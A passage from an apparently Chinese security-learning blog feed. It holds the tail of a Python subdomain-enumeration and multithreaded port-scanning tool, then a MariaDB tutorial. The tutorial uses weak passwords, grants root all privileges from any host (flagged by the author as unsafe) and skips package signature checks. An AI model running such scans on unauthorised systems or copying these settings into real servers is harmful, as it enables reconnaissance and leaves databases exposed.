class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">portscan</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, subdomains, ports</span>):</span><br><span class="line">        self.subdomains = subdomains</span><br><span class="line">        self.ports = ports</span><br><span class="line">        self.lock = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">port_scan</span>(<span class="params">self, host, ports</span>):</span><br><span class="line">        openports = []</span><br><span class="line">        self.lock.acquire()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.settimeout(<span class="number">2</span>)</span><br><span class="line">                result = s.connect_ex((host, <span class="built_in">int</span>(port)))</span><br><span class="line">                <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">                    openports.append(port)</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        self.lock.release()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(openports) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s%s%s - %sFound open ports:%s %s%s%s&quot;</span> % (G, host, W, R, W, Y, <span class="string">&#x27;, &#x27;</span>.join(openports), W))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        self.lock = threading.BoundedSemaphore(value=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> self.subdomains:</span><br><span class="line">            t = threading.Thread(target=self.port_scan, args=(subdomain, self.ports))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">domain, threads, savefile, ports, silent, verbose, enable_bruteforce, engines</span>):</span><br><span class="line">    bruteforce_list = <span class="built_in">set</span>()</span><br><span class="line">    search_list = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_windows:</span><br><span class="line">        subdomains_queue = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        subdomains_queue = multiprocessing.Manager().<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check Bruteforce Status</span></span><br><span class="line">    <span class="keyword">if</span> enable_bruteforce <span class="keyword">or</span> enable_bruteforce <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        enable_bruteforce = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Validate domain</span></span><br><span class="line">    domain_check = re.<span class="built_in">compile</span>(<span class="string">&quot;^(http|https)?[a-zA-Z0-9]+([\-\.]&#123;1&#125;[a-zA-Z0-9]+)*\.[a-zA-Z]&#123;2,&#125;$&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain_check.<span class="keyword">match</span>(domain):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            <span class="built_in">print</span>(R + <span class="string">&quot;Error: Please enter a valid domain&quot;</span> + W)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">or</span> <span class="keyword">not</span> domain.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">        domain = <span class="string">&#x27;http://&#x27;</span> + domain</span><br><span class="line"></span><br><span class="line">    parsed_domain = urlparse.urlparse(domain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">        <span class="built_in">print</span>(B + <span class="string">&quot;[-] Enumerating subdomains now for %s&quot;</span> % parsed_domain.netloc + W)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verbose <span class="keyword">and</span> <span class="keyword">not</span> silent:</span><br><span class="line">        <span class="built_in">print</span>(Y + <span class="string">&quot;[-] verbosity is enabled, will show the subdomains results in realtime&quot;</span> + W)</span><br><span class="line"></span><br><span class="line">    supported_engines = &#123;<span class="string">&#x27;baidu&#x27;</span>: BaiduEnum,</span><br><span class="line">                         <span class="string">&#x27;yahoo&#x27;</span>: YahooEnum,</span><br><span class="line">                         <span class="string">&#x27;google&#x27;</span>: GoogleEnum,</span><br><span class="line">                         <span class="string">&#x27;bing&#x27;</span>: BingEnum,</span><br><span class="line">                         <span class="string">&#x27;ask&#x27;</span>: AskEnum,</span><br><span class="line">                         <span class="string">&#x27;netcraft&#x27;</span>: NetcraftEnum,</span><br><span class="line">                         <span class="string">&#x27;dnsdumpster&#x27;</span>: DNSdumpster,</span><br><span class="line">                         <span class="string">&#x27;virustotal&#x27;</span>: Virustotal,</span><br><span class="line">                         <span class="string">&#x27;threatcrowd&#x27;</span>: ThreatCrowd,</span><br><span class="line">                         <span class="string">&#x27;ssl&#x27;</span>: CrtSearch,</span><br><span class="line">                         <span class="string">&#x27;passivedns&#x27;</span>: PassiveDNS</span><br><span class="line">                         &#125;</span><br><span class="line"></span><br><span class="line">    chosenEnums = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> engines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        chosenEnums = [</span><br><span class="line">            BaiduEnum, YahooEnum, GoogleEnum, BingEnum, AskEnum,</span><br><span class="line">            NetcraftEnum, DNSdumpster, Virustotal, ThreatCrowd,</span><br><span class="line">            CrtSearch, PassiveDNS</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        engines = engines.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> engine <span class="keyword">in</span> engines:</span><br><span class="line">            <span class="keyword">if</span> engine.lower() <span class="keyword">in</span> supported_engines:</span><br><span class="line">                chosenEnums.append(supported_engines[engine.lower()])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start the engines enumeration</span></span><br><span class="line">    enums = [enum(domain, [], q=subdomains_queue, silent=silent, verbose=verbose) <span class="keyword">for</span> enum <span class="keyword">in</span> chosenEnums]</span><br><span class="line">    <span class="keyword">for</span> enum <span class="keyword">in</span> enums:</span><br><span class="line">        enum.start()</span><br><span class="line">    <span class="keyword">for</span> enum <span class="keyword">in</span> enums:</span><br><span class="line">        enum.join()</span><br><span class="line"></span><br><span class="line">    subdomains = <span class="built_in">set</span>(subdomains_queue)</span><br><span class="line">    <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">        search_list.add(subdomain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> enable_bruteforce:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            <span class="built_in">print</span>(G + <span class="string">&quot;[-] Starting bruteforce module now using subbrute..&quot;</span> + W)</span><br><span class="line">        record_type = <span class="literal">False</span></span><br><span class="line">        path_to_file = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        subs = os.path.join(path_to_file, <span class="string">&#x27;subbrute&#x27;</span>, <span class="string">&#x27;names.txt&#x27;</span>)</span><br><span class="line">        resolvers = os.path.join(path_to_file, <span class="string">&#x27;subbrute&#x27;</span>, <span class="string">&#x27;resolvers.txt&#x27;</span>)</span><br><span class="line">        process_count = threads</span><br><span class="line">        output = <span class="literal">False</span></span><br><span class="line">        json_output = <span class="literal">False</span></span><br><span class="line">        bruteforce_list = subbrute.print_target(parsed_domain.netloc, record_type, subs, resolvers, process_count, output, json_output, search_list, verbose)</span><br><span class="line"></span><br><span class="line">    subdomains = search_list.union(bruteforce_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        subdomains = <span class="built_in">sorted</span>(subdomains, key=subdomain_sorting_key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> savefile:</span><br><span class="line">            write_file(savefile, subdomains)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            <span class="built_in">print</span>(Y + <span class="string">&quot;[-] Total Unique Subdomains Found: %s&quot;</span> % <span class="built_in">len</span>(subdomains) + W)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ports:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">                <span class="built_in">print</span>(G + <span class="string">&quot;[-] Start port scan now for the following ports: %s%s&quot;</span> % (Y, ports) + W)</span><br><span class="line">            ports = ports.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            pscan = portscan(subdomains, ports)</span><br><span class="line">            pscan.run()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> silent:</span><br><span class="line">            <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                <span class="built_in">print</span>(G + subdomain + W)</span><br><span class="line">    <span class="keyword">return</span> subdomains</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interactive</span>():</span><br><span class="line">    args = parse_args()</span><br><span class="line">    domain = args.domain</span><br><span class="line">    threads = args.threads</span><br><span class="line">    savefile = args.output</span><br><span class="line">    ports = args.ports</span><br><span class="line">    enable_bruteforce = args.bruteforce</span><br><span class="line">    verbose = args.verbose</span><br><span class="line">    engines = args.engines</span><br><span class="line">    <span class="keyword">if</span> verbose <span class="keyword">or</span> verbose <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        verbose = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> args.no_color:</span><br><span class="line">        no_color()</span><br><span class="line">    banner()</span><br><span class="line">    res = main(domain, threads, savefile, ports, silent=<span class="literal">False</span>, verbose=verbose, enable_bruteforce=enable_bruteforce, engines=engines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    interactive()</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="/img/20220624204418.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mariadb数据库</title>
      <link href="/2024/05/25/mariadb%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2024/05/25/mariadb%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="1-数据库是什么？"><a href="#1-数据库是什么？" class="headerlink" title="1 数据库是什么？"></a>1 数据库是什么？</h1><p> 数据库(Database)是按照数据结构来组织、存储和管理数据的仓库，它产生于距今六十多年前，随着信息技术和市场的发展，特别是二十世纪九十年代以后，数据管理不再仅仅是存储和管理数据，而转变成用户所需要的各种数据管理的方式。数据库有很多种类型，从最简单的存储有各种数据的表格到能够进行海量数据存储的大型数据库系统都在各个方面得到了广泛的应用。</p><h1 id="2-数据库类型"><a href="#2-数据库类型" class="headerlink" title="2 数据库类型"></a>2 数据库类型</h1><h2 id="2-1-关系系数据库"><a href="#2-1-关系系数据库" class="headerlink" title="2.1 关系系数据库"></a>2.1 关系系数据库</h2><p>Oracle（它是数据库行业霸主，没有之一）</p><p>MySql</p><p>Microsoft SQL Server</p><p>SQLite</p><p>PostgreSQL</p><p>IBM DB2</p><p>…</p><h2 id="2-2-非关系型数据库"><a href="#2-2-非关系型数据库" class="headerlink" title="2.2 非关系型数据库"></a>2.2 非关系型数据库</h2><p>MongoDB</p><p>Cassandra</p><p>Redis</p><p>HBase</p><p>neo4j</p><p>…</p><h2 id="2-3-区别"><a href="#2-3-区别" class="headerlink" title="2.3 区别"></a>2.3 区别</h2><p> 关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织。</p><p> 非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。</p><h1 id="3-mariadb简介"><a href="#3-mariadb简介" class="headerlink" title="3 mariadb简介"></a>3 mariadb简介</h1><p> MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。在存储引擎方面，使用XtraDB（英语：XtraDB）来代替MySQL的InnoDB。 MariaDB由MySQL的创始人Michael Widenius（英语：Michael Widenius）主导开发，他早前曾以10亿美元的价格，将自己创建的公司MySQL AB卖给了SUN，此后，随着SUN被甲骨文（oracle）收购，MySQL的所有权也落入Oracle的手中。MariaDB名称来自Michael Widenius的女儿Maria的名字。</p><h1 id="4-安装数据库"><a href="#4-安装数据库" class="headerlink" title="4 安装数据库"></a>4 安装数据库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装MySQL</span></span><br><span class="line">wget https://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum -y install mysql-community-server</span><br><span class="line">如果报错公钥尚未安装，使用这个命令安装：</span><br><span class="line">yum -y install mysql-community-server --nogpgcheck</span><br><span class="line"><span class="comment">#安装mariadb</span></span><br><span class="line">yum -y install mariadb mariadb-server</span><br></pre></td></tr></table></figure><h1 id="5-启动数据库"><a href="#5-启动数据库" class="headerlink" title="5 启动数据库"></a>5 启动数据库</h1><p>启动数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure><p>查看服务运行状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status mariadb</span><br></pre></td></tr></table></figure><p>可以看到默认是没有密码的。</p><p><img src="/img/20230205123809.png"></p><h3 id="3-2-1-设置密码"><a href="#3-2-1-设置密码" class="headerlink" title="3.2.1 设置密码"></a>3.2.1 设置密码</h3><p>设置密码为123456，这条命令必须在mariadb服务启动后才能执行。</p><p><img src="/img/20230205123922.png"></p><p>重启mariadb服务，然后使用<code>mysql -u root </code> 依然能直接登入数据库。</p><p>在mariadb10.4.11中mysql.user 表目前已不起作用了，真正的表是 <code>mysql.global_priv</code> 表，查询后我们发现root用户是<code>unix_socker</code>类型，这就是为啥总能直接登陆的问题。</p><p>解决办法：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> root<span class="variable">@localhost</span> IDENTIFIED VIA mysql_native_password <span class="keyword">USING</span> PASSWORD(&quot;123456&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/20230205124956.png"></p><h3 id="3-2-3-修改密码"><a href="#3-2-3-修改密码" class="headerlink" title="3.2.3 修改密码"></a>3.2.3 修改密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;1qaz@WSX&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205125445.png"></p><p>密码要符合复杂度要求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看默认密码复杂度</span><br><span class="line">SHOW VARIABLES LIKE &#x27;validate_password%&#x27;;</span><br><span class="line"></span><br><span class="line">如需修改密码复杂度参考如下命令：</span><br><span class="line">set global validate_password_policy=LOW;</span><br><span class="line">set global validate_password_length=7;</span><br></pre></td></tr></table></figure><h1 id="6-创建并使用数据库"><a href="#6-创建并使用数据库" class="headerlink" title="6 创建并使用数据库"></a>6 创建并使用数据库</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库：</span><br><span class="line">create database farmsec;</span><br><span class="line"></span><br><span class="line">查看数据库：</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">使用数据库：</span><br><span class="line">use farmsec;</span><br><span class="line"></span><br><span class="line">创建表：</span><br><span class="line">create table user(id int,name varchar(20),password varchar(15));</span><br><span class="line"></span><br><span class="line">表中插入数据：</span><br><span class="line">insert into user(id,name,password) value(1,&quot;admin&quot;,&quot;123456&quot;);</span><br><span class="line"></span><br><span class="line">最简单的查询：</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205130058.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接在shell执行</span><br><span class="line">mysql -u root -p123456 -e &quot;show databases&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205142226.png"></p><h1 id="7-客户端连接数据库"><a href="#7-客户端连接数据库" class="headerlink" title="7 客户端连接数据库"></a>7 客户端连接数据库</h1><p>使数据库可以被远程客户端连接：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用mysql系统数据库:</span><br><span class="line">use mysql;   </span><br><span class="line"></span><br><span class="line">配置其他主机访问数据库:</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span>IDENTIFIED BY <span class="string">&#x27;123456&#x27;</span> WITH GRANT OPTION;<span class="comment">#其实这条指令不安全，开放了全部权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grant 权限1,权限2,…权限n on 数据库名称.表名称 to <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;用户地址&#x27;</span> identified by <span class="string">&#x27;连接口令&#x27;</span>;</span><br><span class="line"><span class="comment">#权限1,权限2,…权限n代表select,insert,update,delete,create,drop,index,alter,grant,references,reload,shutdown,process,file等14个权限。当权限1,权限2,…权限n被all privileges或者all代替，表示赋予用户全部权限。</span></span><br><span class="line"><span class="comment">#当数据库名称.表名称被*.*代替，表示赋予用户操作服务器上所有数据库所有表的权限。</span></span><br><span class="line"><span class="comment">#用户地址可以是localhost，也可以是ip地址、机器名字、域名。也可以用’%&#x27;表示从任何地址连接。</span></span><br><span class="line"><span class="string">&#x27;连接口令&#x27;</span>不能为空，否则创建失败。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">从mysql数据库中的授权表重新载入权限（刷新权限）</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h2 id="7-1-使用navicat远程连接"><a href="#7-1-使用navicat远程连接" class="headerlink" title="7.1 使用navicat远程连接"></a>7.1 使用navicat远程连接</h2><p>点击连接,选择mariadb,填写ip,用户和密码点击确认</p><p>生产环境下不建议使用破解版，万一破解工具有后门就寄了，这就是供应链攻击，参考xshell后门事件。</p><p><strong>dbeaver</strong>是一个好用，<strong>免费</strong>，开源的数据库连接工具，有社区版和企业版本，社区版足够了。下载地址：<a href="https://dbeaver.io/download/">https://dbeaver.io/download/</a></p><p><strong>phpMyAdmin</strong>是基于Web的<strong>MySQL</strong>管理工具，它是用PHP编写的，<strong>免费</strong>。但是它不支持sqlite，查看sqlite需要安装phpliteAdmin。</p><p><strong>DataGrip</strong>是jetbrins公司开发的。可以连接多种数据库，非常方便，但是<strong>收费</strong>。</p><h2 id="7-2-使用kali远程连接"><a href="#7-2-使用kali远程连接" class="headerlink" title="7.2 使用kali远程连接"></a>7.2 使用kali远程连接</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.0.33 -u root -p123456</span><br></pre></td></tr></table></figure><h1 id="8-语法"><a href="#8-语法" class="headerlink" title="8 语法"></a>8 语法</h1><p>关于sql语句大小写，有些程序员为了区分SQL语句与SQL数据，就sql语句全大写，SQL数据全小写，比较好看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">增加数据：</span><br><span class="line">insert into user(id,name,sex,age) value(11,&quot;qaq&quot;,&quot;boy&quot;,&quot;23&quot;);</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">select * from user where id=11;</span><br><span class="line"></span><br><span class="line">修改数据：</span><br><span class="line">update user set name=&quot;QAQ&quot; where id=11;</span><br><span class="line"></span><br><span class="line">删除数据：</span><br><span class="line">delete from user where id=11;</span><br><span class="line"></span><br><span class="line">删除数据库：</span><br><span class="line">drop database farmsec;</span><br></pre></td></tr></table></figure><p>查看数据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找表中所有内容：</span><br><span class="line">select * from user;</span><br><span class="line"></span><br><span class="line">查找表中单列内容：</span><br><span class="line">select name from user;</span><br><span class="line"></span><br><span class="line">查找表中多列内容：</span><br><span class="line">select name,age from user;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只返回前3行数据：</span><br><span class="line">select name,age from user limit 3;</span><br><span class="line"></span><br><span class="line">排序： </span><br><span class="line">select name,age from user order by age;</span><br><span class="line"></span><br><span class="line">倒序： </span><br><span class="line">select name,age from user order by age DESC;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">统计数量，<span class="keyword">group</span> <span class="keyword">by</span> sex意思是以性别为分组：</span><br><span class="line"><span class="keyword">select</span> sex,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">group</span> <span class="keyword">by</span> sex;</span><br><span class="line"></span><br><span class="line">统计数量并排序：</span><br><span class="line"><span class="keyword">select</span> sex,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">group</span> <span class="keyword">by</span> sex <span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205170636.png"></p><p>where子句:</p><p>使用WHERE子句，我们可以指定一个选择标准，从表中选择所需的记录。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个条件：</span><br><span class="line">select * from user where id=3;</span><br><span class="line"></span><br><span class="line">多个条件：</span><br><span class="line">select * from user where age=18 and sex=&#x27;boy&#x27;;</span><br><span class="line">select * from user where age=18 or sex=&#x27;boy&#x27;;</span><br><span class="line">查询年龄16或者18或者27的数据</span><br><span class="line">select * from user where age in (16,18,27);</span><br><span class="line">当or和and一起出现时，会以or为断句点，也就是说and优先级大于or，先执行and再执行or。</span><br><span class="line">查询性别为男并且年龄18的数据，或者性别为女的数据：</span><br><span class="line">select * from user where sex=&quot;boy&quot; and age=18 or sex=&quot;girl&quot;;</span><br><span class="line">查询性别为男的数据，或者年龄18并且性别为女的数据：</span><br><span class="line">select * from user where sex=&quot;boy&quot; or age=18 and sex=&quot;girl&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模糊查询名字中y结尾的</span><br><span class="line">select * from user where name like &#x27;%y&#x27;;</span><br><span class="line">模糊查询名字中to开头的</span><br><span class="line">select * from user where name like &#x27;to%&#x27;;</span><br><span class="line">模糊查询名字中带y的</span><br><span class="line">select * from user where name like &#x27;%y%&#x27;;</span><br></pre></td></tr></table></figure><p>运算符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where age&gt;20;</span><br></pre></td></tr></table></figure><table><thead><tr><th>&#x3D;</th><th>检查两个操作数的值是否相等，如果是，则条件变为真。</th><th>(A &#x3D; B) 不为 true.</th></tr></thead><tbody><tr><td>!&#x3D;</td><td>检查两个操作数的值是否相等，如果值不相等，则条件变为真。</td><td>(A !&#x3D; B) 为 true.</td></tr><tr><td>&gt;</td><td>检查左操作数的值是否大于右操作数的值，如果是，则条件为真。</td><td>(A &gt; B) 不为 true.</td></tr><tr><td>&lt;</td><td>检查左操作数的值是否小于右操作数的值，如果是，则条件为真。</td><td>(A &lt; B) 为 true.</td></tr><tr><td>&gt;&#x3D;</td><td>检查左操作数的值是否大于或等于右操作数的值，如果是，则条件为真。</td><td>(A &gt;&#x3D; B) 不为 true.</td></tr><tr><td>&lt;&#x3D;</td><td>检查左操作数的值是否小于或等于右操作数的值，如果是，则条件变为真。</td><td>(A &lt;&#x3D; B) 为 true.</td></tr></tbody></table><p>子查询：</p><p>在select 中子查询总是从内向外处理。先处理括号内部的在处理括号外部的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,age from user where name in(select name from buy);</span><br></pre></td></tr></table></figure><p>多表查询:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user.id,user.name,buy.shop from user,buy where user.name=buy.name;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INNER JOIN: 在两个表中间如果表中有至少一个匹配，则返回行</span><br><span class="line">select user.age,buy.shop from user inner join buy on user.name=buy.name;</span><br><span class="line"></span><br><span class="line">LEFT JOIN: 以左表为标杆，即使右表中没有与左表可匹配的数据，也从左表返回所有的行</span><br><span class="line">select user.age,buy.shop from user left join buy on user.name=buy.name;</span><br><span class="line"></span><br><span class="line">RIGHT JOIN: 以右表为标杆，即使左表中没有与右表可匹配的数据，也从右表返回所有的行</span><br><span class="line">select user.age,buy.shop from user right join buy on user.name=buy.name;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205174808.png"></p><p><img src="/img/20230205174913.png"></p><p><img src="/img/20230205175025.png"></p><p>联合查询：</p><p>Union语句必须有两条或者以上的select语句,语句之间用union隔开。 每个查询必须包含相同的列、表达式或者聚合函数。 不过次序可以不统一。列数据的类型必须兼容类型不必完全相同。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name from user union select name from buy;</span><br><span class="line"></span><br><span class="line">union all 不去重</span><br><span class="line">select name from user union all select name from buy;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205175433.png"></p><h1 id="9-函数"><a href="#9-函数" class="headerlink" title="9 函数"></a>9 函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回当前用户:</span><br><span class="line">select user();</span><br><span class="line"></span><br><span class="line">返回数据库的版本号:</span><br><span class="line">select version();</span><br><span class="line"></span><br><span class="line">返回当前数据库名:</span><br><span class="line">select database();</span><br><span class="line"></span><br><span class="line">休眠参数给定的秒数：</span><br><span class="line">select sleep(5);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取从字符串s中的第n个位置开始长度为len的字符串:</span><br><span class="line">substring(s,n,len)</span><br><span class="line">select substring(user(),2,3);</span><br><span class="line">select substring(&quot;hello&quot;,2,3);</span><br><span class="line"></span><br><span class="line">length()/char_length():   </span><br><span class="line"></span><br><span class="line">char_length(str)</span><br><span class="line">计算单位：字符</span><br><span class="line">不管汉字还是数字或者是字母都算是一个字符</span><br><span class="line"></span><br><span class="line">length(str)</span><br><span class="line">计算单位：字节</span><br><span class="line">utf8编码：一个汉字三个字节，一个数字或字母一个字节。</span><br><span class="line">gbk编码：一个汉字两个字节，一个数字或字母一个字节。</span><br></pre></td></tr></table></figure><h1 id="10-忘记密码"><a href="#10-忘记密码" class="headerlink" title="10 忘记密码"></a>10 忘记密码</h1><p>在mariadb的使用中忘记密码后先停止mariadb的服务</p><p>修改配置文件&#x2F;etc&#x2F;my.cnf在[mysqld]下添加 skip-grant-tables后保存</p><p><img src="/img/20230205154502.png"></p><p>启动mariadb服务,使用空密码方式使用root用户登录mariadb</p><p>修改root用户的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;1qaz@WSX&#x27;) where User=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure><p>刷新权限表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>退出数据库并删除配置文件中的skip-grant-tables</p><p>重启mariadb,使用新设置的密码登录</p><h1 id="11-热备-不重要"><a href="#11-热备-不重要" class="headerlink" title="11 热备(不重要)"></a>11 热备(不重要)</h1><p> Mysql数据库没有增量备份的机制，当数据量太大的时候备份是一个很大的问题。还好mysql数据库提供了主从备份的机制，其实就是把主数据库的所有的数据同时写到备份的数据库中。实现mysql数据库的热备份。 </p><p>主从复制：</p><p> 主库授权从库远程连接，读取binlog日志并更新到本地数据库的过程；主库写数据后，从库会自动同步过来（从库跟着主库变）； </p><p>主主复制：</p><p> 主从相互授权连接，读取对方binlog日志并更新到本地数据库的过程；只要对方数据改变，自己就跟着改变； 要想实现双机的热备，首先要了解主从数据库服务器的版本的需求。要实现热备mysql的版本都高于3.2。还有一个基本的原则就是作为从数据库的数据版本可以高于主服务器数据库的版本，但是不可以低于主服务器的数据库版本。 当然要实现mysql双机热备，除了mysql本身自带的REPLICATION功能可以实现外，也可以用Heartbeat这个开源软件来实现。</p><hr><p>同时在两个服务器建立连接帐户,该帐户必须授予REPLIATION SLAVE权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant replication slave on *.* to &#x27;farmsec&#x27;@&#x27;192.168.11.233&#x27; identified by &#x27;1qaz@WSX&#x27;;</span><br><span class="line">grant replication slave on *.* to &#x27;farmsec&#x27;@&#x27;192.168.11.201&#x27; identified by 